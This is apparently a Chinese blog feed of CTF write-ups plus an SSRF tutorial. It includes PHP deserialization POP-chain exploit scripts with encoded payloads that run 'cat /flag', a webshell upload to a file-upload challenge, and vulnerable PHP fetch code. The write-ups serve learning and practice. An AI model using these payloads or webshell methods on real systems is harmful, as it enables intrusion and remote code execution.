class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public <span class="variable">$dusk</span>;</span><br><span class="line">    public <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this-</span>&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            echo <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this-</span>&gt;over-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public <span class="variable">$nothing</span>;</span><br><span class="line">    public <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> getflag() &#123;</span><br><span class="line">        eval(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Crypto &#123;</span><br><span class="line">    public <span class="keyword">function</span> __wakeup() &#123;</span><br><span class="line">        echo <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> getflag() &#123;</span><br><span class="line">        echo <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span> = new web();</span><br><span class="line"><span class="variable">$a-</span>&gt;kw = new re();</span><br><span class="line"><span class="variable">$a-</span>&gt;kw-&gt;chu<span class="number">0</span> = new pwn();</span><br><span class="line"><span class="variable">$a-</span>&gt;kw-&gt;chu<span class="number">0</span>-&gt;dusk = <span class="string">&quot;gods&quot;</span>;</span><br><span class="line"><span class="variable">$a-</span>&gt;kw-&gt;chu<span class="number">0</span>-&gt;over = new Misc();</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br><span class="line">//O<span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22web</span><span class="meta">%22</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%22kw</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%22re</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22chu0</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22pwn</span><span class="meta">%22</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22dusk</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22gods</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22over</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Misc</span><span class="meta">%22</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A7</span><span class="meta">%3A</span><span class="meta">%22nothing</span><span class="meta">%22</span><span class="meta">%3BN</span><span class="meta">%3Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22flag</span><span class="meta">%22</span><span class="meta">%3BN</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7Ds</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%22dt</span><span class="meta">%22</span><span class="meta">%3BN</span><span class="meta">%3B</span><span class="meta">%7DALL</span> Done!</span><br></pre></td></tr></table></figure><p>传进去得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823221539045.png" alt="image-20240823221539045"></p><h4 id="Week2-Really-EZ-POP"><a href="#Week2-Really-EZ-POP" class="headerlink" title="[Week2] Really EZ POP"></a>[Week2] Really EZ POP</h4><p>考点：pop链</p><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>看到了函数</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__destrust</span>(),<span class="built_in">__invoke</span>(),<span class="built_in">__toString</span>()</span><br></pre></td></tr></table></figure><p>构造pop链：</p><p>nature -&gt; sea -&gt; Shark -&gt; Sink</p><p>由于私有属性问题，要在Shark类中构造个函数setWord()。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$cmd</span> = <span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;</span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        eval(<span class="variable">$this-</span>&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">public <span class="keyword">function</span> setWord(<span class="variable">$word</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$this-</span>&gt;word = <span class="variable">$word</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    public <span class="keyword">function</span> __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable">$this-</span>&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$animal</span>;</span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$name</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable">$this-</span>&gt;animal;</span><br><span class="line">        echo <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="variable">$this-</span>&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span> = new Nature();</span><br><span class="line"><span class="variable">$a-</span>&gt;sea = new Sea();</span><br><span class="line"><span class="variable">$b</span> = new Sink();</span><br><span class="line"><span class="variable">$c</span> = new Shark();</span><br><span class="line"><span class="variable">$c-</span>&gt;setWord(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a-</span>&gt;sea-&gt;animal =<span class="variable">$c</span>;</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br><span class="line">//O<span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22Nature</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22sea</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22Sea</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22animal</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Shark</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A11</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%00Shark</span><span class="meta">%00word</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Sink</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A9</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%00Sink</span><span class="meta">%00cmd</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A20</span><span class="meta">%3A</span><span class="meta">%22system</span><span class="meta">%28</span><span class="meta">%22cat</span>+<span class="meta">%2Fflag</span><span class="meta">%22</span><span class="meta">%29</span><span class="meta">%3B</span><span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><p>直接用hackerbar进行post传参无回显，那就bp抓包，在Body里的参数里的值进行重新复制就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909213202742.png" alt="image-20240909213202742"></p><p>放行后得到flag回显</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909213317991.png" alt="image-20240909213317991"></p><h4 id="Week2-数学大师"><a href="#Week2-数学大师" class="headerlink" title="[Week2] 数学大师"></a>[Week2] 数学大师</h4><p>考点：python的requests库（见脚本）</p><p>每⼀道题⽬需要在 5 秒内解出, 传⼊到  $_POST[‘answer’]  中, 解出 50 道即可, 除法取整 。  考察使⽤ Python 的 requests 库写脚本，注意在请求时要开启 session cookie。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909215036189.png" alt="image-20240909215036189"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moectf-week2-wp</title>
      <link href="/posts/5cf8ea4.html"/>
      <url>/posts/5cf8ea4.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="the-secret-of-snowball"><a href="#the-secret-of-snowball" class="headerlink" title="the_secret_of_snowball"></a>the_secret_of_snowball</h2><p>考点：破损文件，010editor查看</p><p>打开文件，是张破损的jpg文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133131744.png" alt="image-20240817133131744"></p><p>放进010editor，修改前缀。jpg文件前缀是FF D8 FF E1</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133354097.png" alt="image-20240817133354097"></p><p>找到一半flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133442469.png" alt="image-20240817133442469"></p><p>另一半去哪里了呢？在010editor末尾看到了一串特殊密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133535723.png" alt="image-20240817133535723"></p><p>进行解密得到另一半</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133602024.png" alt="image-20240817133602024"></p><p>最后合在一起，就是完整的flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817133637981.png" alt="image-20240817133637981"></p><h2 id="每人至少300份"><a href="#每人至少300份" class="headerlink" title="每人至少300份"></a>每人至少300份</h2><p>考点：二维码拼接</p><p>下载文件，是一堆分割的二维码，需要将二维码拼上，在进行扫描，就能看到信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817141836614.png" alt="image-20240817141836614"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817141851780.png" alt="image-20240817141851780"></p><p>扫出来后是一串字符。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e561ff9135302b887e6b64287561c26c.jpg" alt="img"></p><p>解码得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817142028581.png" alt="image-20240817142028581"></p><h2 id="解不完的压缩包"><a href="#解不完的压缩包" class="headerlink" title="解不完的压缩包"></a>解不完的压缩包</h2><p>考点：压缩包套娃</p><p>下载文件，是压缩包套娃，999个压缩包重叠，没有密码，可以手动解压（雾）。</p><p>python脚本更快。（见脚本笔记）</p><p>解压完后最后一个压缩包里面有加密文件和flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817152112946.png" alt="image-20240817152112946"></p><p>前四个压缩大小和原始大小一样，考虑使用ZipCracker工具的CRC32碰撞提取内容，得到flag.txt的密码，最后得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817152300961.png" alt="image-20240817152300961"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240817152342829.png" alt="image-20240817152342829"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="垫刀之路01-MoeCTF？启动！"><a href="#垫刀之路01-MoeCTF？启动！" class="headerlink" title="垫刀之路01: MoeCTF？启动！"></a>垫刀之路01: MoeCTF？启动！</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818224107906.png" alt="image-20240818224107906"></p><p>先直接查看flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818224221189.png" alt="image-20240818224221189"></p><p>查看环境变量，执行set命令。出flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818224311183.png" alt="image-20240818224311183"></p><h2 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h2><p>考点：文件上传漏洞</p><p>随便上传一个一句话木马，用bp抓包将jpg修改成php。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818225624354.png" alt="image-20240818225624354"></p><p>记下位置：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">50569</span><span class="regexp">/uploads/yi</span>juhua.php</span><br></pre></td></tr></table></figure><p>用蚁剑连接：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818225907355.png" alt="image-20240818225907355"></p><p>之后打开虚空终端，输入set查看环境变量，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818230034762.png" alt="image-20240818230034762"></p><h2 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h2><p>考点：文件上传漏洞</p><p>只是进行了图片限制，只能上传图片类型，解法跟上面垫刀之路02一样。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞</title>
      <link href="/posts/50cf5e7c.html"/>
      <url>/posts/50cf5e7c.html</url>
      
        <content type="html"><![CDATA[<p>SSRF漏洞原理攻击与防御</p><p>一、SSRF是什么？<br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>二、SSRF漏洞原理<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/966c60217969cfa4cf88e7c25bc06ea9.png" alt="在这里插入图片描述"></p><p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><p>三、SSRF漏洞挖掘<br>1、分享：通过URL地址分享网页内容</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/407be09f844afc7ebd841f62875762b6.jpeg" alt="在这里插入图片描述"></p><p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p><p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9a65e1c17a2c64f2f1a3cf799922f881.png" alt="在这里插入图片描述">4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="built_in">title</span>.xxx.com/<span class="built_in">title</span>?<span class="built_in">title</span>=http://<span class="built_in">title</span>.xxx.com/as52ps63de</span><br></pre></td></tr></table></figure><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p><p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0b34525503d3f85c341b0c59f3f277f8.png" alt="在这里插入图片描述"></p><p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p><p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p><p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">share</span><br><span class="line">wap</span><br><span class="line">url</span><br><span class="line">link</span><br><span class="line"><span class="attribute">src</span></span><br><span class="line"><span class="selector-tag">source</span></span><br><span class="line">target</span><br><span class="line">u</span><br><span class="line"><span class="attribute">display</span></span><br><span class="line">sourceURl</span><br><span class="line">imageURL</span><br><span class="line">domain</span><br></pre></td></tr></table></figure><p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p><p>四、产生SSRF漏洞的函数<br>SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。</p><p>1、file_get_contents:</p><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2、sockopen():</p><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>3、curl_exec():</p><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span 